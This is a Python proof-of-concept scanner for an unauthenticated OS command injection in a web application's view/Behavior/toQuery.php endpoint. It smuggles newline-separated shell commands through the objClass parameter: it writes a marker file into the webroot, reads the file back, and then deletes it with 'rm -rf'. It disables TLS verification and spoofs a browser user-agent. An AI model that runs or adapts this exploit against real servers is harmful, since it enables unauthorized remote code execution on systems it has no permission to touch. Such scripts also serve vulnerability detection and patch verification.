import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
n1=randomInt(800000, 1000000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
n2=randomInt(800000, 1000000)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20"+str(n1)+"%20%3E/var/www/reporter/view/Behavior/"+str(n2)+".txt%0a"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
	else:
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"view/Behavior/"+str(n2)+".txt"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(n1) in response.text:
		r2=True
	else:
		r2=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"view/Behavior/toQuery.php?method=getList&objClass=%0arm%20-rf%20/var/www/reporter/view/Behavior/"+str(n2)+".txt%0a"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r3=True
	else:
		r3=False
	if r1 and r2 and r3:
		return True
	else:
		return False
